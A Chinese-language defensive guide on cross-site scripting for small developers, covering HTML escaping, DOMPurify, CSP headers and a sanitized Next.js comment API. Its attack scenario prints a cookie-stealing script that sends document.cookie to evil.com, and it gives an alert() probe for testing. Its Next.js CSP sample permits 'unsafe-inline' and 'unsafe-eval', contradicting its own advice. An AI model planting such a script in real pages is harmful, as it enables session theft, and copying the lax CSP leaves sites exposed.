# XSS 攻击

## 元数据
- **tier适用**: L1 ✅ | L2 ✅ | L3 ✅
- **领域**: api
- **严重程度**: high
- **修复成本**: L1: 免费 | L2: $0-50 | L3: 企业方案
- **独立开发者适用度**: ⭐⭐⭐⭐⭐ (5/5)
- **最后验证日期**: 2026-06-11

---

## L1 独立开发者版（速查版）

### 你会遭遇什么（一句话）
用户输入包含恶意脚本，在其他用户浏览器执行，可窃取 Cookie、劫持会话、钓鱼诈骗。

### 一分钟识别
你的产品是否有以下特征：
- [ ] 用户生成内容（评论、帖子、昵称）直接显示在页面上
- [ ] 使用 `innerHTML`、`dangerouslySetInnerHTML` 渲染用户内容
- [ ] URL 参数直接输出到页面
- [ ] 错误信息直接显示用户输入
→ 勾选≥1项，即需关注此风险

### 一句话防御
输出时进行 HTML 转义 + 配置 CSP（内容安全策略），完全免费，防护效果显著。

### 快速行动清单
1. [ ] **立即（今天）**：检查所有用户输入输出点，添加 HTML 转义
2. [ ] **短期（本周）**：配置 CSP Header，禁止内联脚本执行
3. [ ] **长期（规划中）**：使用安全的前端框架，配置 HttpOnly Cookie

### 推荐工具
- **免费**：
  - [DOMPurify](https://github.com/cure53/DOMPurify) - HTML 净化库，过滤恶意脚本
  - [helmet](https://helmetjs.github.io/) - Express 安全中间件，含 CSP 配置
  - [xss](https://github.com/leizongmin/js-xss) - 中文友好的 XSS 过滤器
- **低成本**：
  - [Cloudflare](https://www.cloudflare.com/) - 免费层含 WAF XSS 防护
  - [Vercel](https://vercel.com/) - 内置安全 Headers 配置

### 验证方法
- [ ] 在输入框输入 `<script>alert('XSS')</script>`，应显示为纯文本而非弹窗
- [ ] 检查 Response Headers 中有 `Content-Security-Policy` 字段
- [ ] 使用 XSS Scanner 工具扫描，应无漏洞报告

---

## L2 小团队版（理解版）

### 场景还原
你的产品是一个社区论坛，用户可以发布帖子和评论。某天，大量用户投诉账号被盗。调查发现，攻击者在帖子中植入了恶意脚本：

```html
<script>
fetch('https://evil.com/steal?cookie=' + document.cookie)
</script>
```

当其他用户浏览这个帖子时，脚本自动执行，将用户的 Session Cookie 发送到攻击者服务器。攻击者利用这些 Cookie 登录了数百个用户账户，修改密码、盗取积分，甚至发布钓鱼内容继续传播。

### 攻击路径（简化版）
1. **发现目标**：攻击者发现论坛评论支持 HTML 格式
2. **测试漏洞**：输入 `<script>alert(1)</script>` 确认可执行
3. **窃取信息**：植入脚本获取 Cookie、localStorage 中的 Token
4. **传播恶意**：将窃取的数据发送到攻击者服务器
5. **持续攻击**：修改正常帖子植入后门，长期潜伏

### 防御实施（低成本方案）

#### 方案A：免费方案（输出转义）

**工具/服务**: HTML 转义函数

**配置步骤**:

```javascript
// ❌ 危险：直接输出用户内容
const renderComment = (comment) => {
  return `<div class="comment">${comment.content}</div>`;
};

// ✅ 安全：HTML 转义
const escapeHtml = (str) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, (char) => map[char]);
};

const renderCommentSafe = (comment) => {
  return `<div class="comment">${escapeHtml(comment.content)}</div>`;
};
```

**React 示例**:

```tsx
// ❌ 危险：dangerouslySetInnerHTML
const Comment = ({ content }) => (
  <div dangerouslySetInnerHTML={{ __html: content }} />
);

// ✅ 安全：React 默认转义
const CommentSafe = ({ content }) => (
  <div>{content}</div> // React 自动转义 HTML
);

// ✅ 如果需要富文本：使用 DOMPurify
import DOMPurify from 'dompurify';

const RichComment = ({ content }) => (
  <div
    dangerouslySetInnerHTML={{
      __html: DOMPurify.sanitize(content, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
        ALLOWED_ATTR: ['href'],
      }),
    }}
  />
);
```

**Vue.js 示例**:

```vue
<template>
  <!-- ❌ 危险：v-html -->
  <div v-html="userContent"></div>

  <!-- ✅ 安全：{{ }} 自动转义 -->
  <div>{{ userContent }}</div>

  <!-- ✅ 如果需要富文本：使用 DOMPurify -->
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  props: ['content'],
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.content, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
      });
    },
  },
};
</script>
```

#### 方案B：低成本方案（CSP 配置）

**工具/服务**: Content Security Policy

**配置步骤**:

```javascript
// Express + Helmet 配置 CSP
const express = require('express');
const helmet = require('helmet');

const app = express();

// 基础 CSP 配置
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // 禁止内联脚本
      styleSrc: ["'self'", "'unsafe-inline'"], // 样式可放宽
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
      // 可选：报告违规
      reportUri: '/api/csp-report',
    },
  })
);

// 如果需要内联脚本，使用 nonce
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.nonce}'`],
      styleSrc: ["'self'", "'unsafe-inline'"],
    },
  })
);

// 在模板中使用 nonce
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <script nonce="${res.locals.nonce}">
        // 这里的内联脚本会被允许执行
        console.log('Safe inline script');
      </script>
    </head>
    <body>Hello</body>
    </html>
  `);
});
```

**Next.js CSP 配置**:

```typescript
// next.config.js
const securityHeaders = [
  {
    key: 'Content-Security-Policy',
    value: `
      default-src 'self';
      script-src 'self' 'unsafe-eval' 'unsafe-inline';
      style-src 'self' 'unsafe-inline';
      img-src 'self' data: https:;
      font-src 'self';
      connect-src 'self' https://api.yourapp.com;
      frame-ancestors 'none';
    `.replace(/\n/g, ''),
  },
  {
    key: 'X-Content-Type-Options',
    value: 'nosniff',
  },
  {
    key: 'X-Frame-Options',
    value: 'DENY',
  },
  {
    key: 'X-XSS-Protection',
    value: '1; mode=block',
  },
];

module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: securityHeaders,
      },
    ];
  },
};
```

**Nginx CSP 配置**:

```nginx
server {
    # CSP Header
    add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none';" always;

    # 其他安全 Headers
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-XSS-Protection "1; mode=block" always;
}
```

### 决策树

```
你的页面是否显示用户生成内容？
├── 是
│   ├── 是否需要富文本？
│   │   ├── 是 → 使用 DOMPurify 净化 + CSP
│   │   └── 否 → HTML 转义输出
│   └── 是否已配置 CSP？
│       ├── 是 → 继续检查是否有绕过
│       └── 否 → 立即配置 CSP
└── 否 → 检查是否有其他 XSS 入口（URL 参数、错误信息）
```

### 完整代码示例

以下是一个完整的 Next.js API + 前端示例，实现安全的用户内容展示：

```typescript
// app/api/comments/route.ts
import { NextRequest, NextResponse } from 'next/server';
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

// 服务端 DOMPurify 初始化
const window = new JSDOM('').window;
const dompurify = DOMPurify(window as any);

// 评论存储（示例用内存，生产环境用数据库）
const comments: Array<{ id: number; author: string; content: string; createdAt: Date }> = [];
let nextId = 1;

// GET /api/comments - 获取评论列表
export async function GET() {
  // 返回已净化的内容
  return NextResponse.json({
    data: comments.map((c) => ({
      ...c,
      // 服务端再次净化（双重保险）
      content: dompurify.sanitize(c.content, {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
        ALLOWED_ATTR: ['href', 'title'],
        ALLOW_DATA_ATTR: false,
      }),
    })),
  });
}

// POST /api/comments - 创建评论
export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { author, content } = body;

    // 输入验证
    if (!author || typeof author !== 'string' || author.length > 50) {
      return NextResponse.json({ error: 'Invalid author' }, { status: 400 });
    }

    if (!content || typeof content !== 'string' || content.length > 5000) {
      return NextResponse.json({ error: 'Invalid content' }, { status: 400 });
    }

    // 服务端净化（存储前净化）
    const sanitizedContent = dompurify.sanitize(content, {
      ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
      ALLOWED_ATTR: ['href', 'title'],
      ALLOW_DATA_ATTR: false,
      // 允许的链接协议
      ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
    });

    const comment = {
      id: nextId++,
      author: author.trim().slice(0, 50), // 纯文本字段，截断即可
      content: sanitizedContent,
      createdAt: new Date(),
    };

    comments.push(comment);

    return NextResponse.json({ data: comment }, { status: 201 });
  } catch (error) {
    console.error('Create comment error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
```

```tsx
// app/comments/CommentList.tsx
'use client';

import { useEffect, useState } from 'react';
import DOMPurify from 'dompurify';

interface Comment {
  id: number;
  author: string;
  content: string;
  createdAt: string;
}

export default function CommentList() {
  const [comments, setComments] = useState<Comment[]>([]);
  const [newComment, setNewComment] = useState('');
  const [author, setAuthor] = useState('');

  useEffect(() => {
    fetchComments();
  }, []);

  const fetchComments = async () => {
    const res = await fetch('/api/comments');
    const data = await res.json();
    setComments(data.data);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const res = await fetch('/api/comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ author, content: newComment }),
    });

    if (res.ok) {
      setNewComment('');
      fetchComments();
    }
  };

  return (
    <div className="max-w-2xl mx-auto p-4">
      <h1 className="text-2xl font-bold mb-4">评论区</h1>

      {/* 评论表单 */}
      <form onSubmit={handleSubmit} className="mb-6 space-y-4">
        <input
          type="text"
          placeholder="昵称"
          value={author}
          onChange={(e) => setAuthor(e.target.value)}
          className="w-full p-2 border rounded"
          maxLength={50}
          required
        />
        <textarea
          placeholder="说点什么..."
          value={newComment}
          onChange={(e) => setNewComment(e.target.value)}
          className="w-full p-2 border rounded h-24"
          maxLength={5000}
          required
        />
        <button
          type="submit"
          className="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
        >
          发表评论
        </button>
      </form>

      {/* 评论列表 */}
      <div className="space-y-4">
        {comments.map((comment) => (
          <div key={comment.id} className="border rounded p-4">
            <div className="flex justify-between text-sm text-gray-500 mb-2">
              <span className="font-medium text-gray-700">
                {/* 纯文本字段，React 自动转义 */}
                {comment.author}
              </span>
              <span>{new Date(comment.createdAt).toLocaleString()}</span>
            </div>
            <div
              className="prose"
              dangerouslySetInnerHTML={{
                // 客户端再次净化（双重保险）
                __html: DOMPurify.sanitize(comment.content, {
                  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
                  ALLOWED_ATTR: ['href'],
                }),
              }}
            />
          </div>
        ))}
      </div>
    </div>
  );
}
```

---

## L3 企业版（深耕版）

本案例的企业级扩展内容，请参考企业版案例库：

- **详细攻击技术**：参见 [enterprise/infosec/api/xss-attack.md](../../../enterprise/infosec/api/xss-attack.md)
- **企业防御架构**：WAF XSS 规则、输入输出双向过滤、沙箱隔离
- **合规要求**：OWASP Top 10 #A03:2021、PCI DSS 安全编码、SOC 2 访问控制
- **监控告警**：CSP 违规报告、异常脚本执行检测、实时告警
- **渗透测试**：XSS 自动化扫描、DOM XSS 测试、存储型 XSS 检测

企业版核心补充：
1. **高级 XSS 类型**：DOM XSS、存储型 XSS、反射型 XSS、突变型 XSS
2. **CSP 高级配置**：report-only 模式、strict-dynamic、基于 nonce 的策略
3. **框架安全**：Angular 安全绑定、Vue 安全模板、React 安全实践
4. **应急响应**：XSS 事件溯源、影响评估、漏洞修复验证
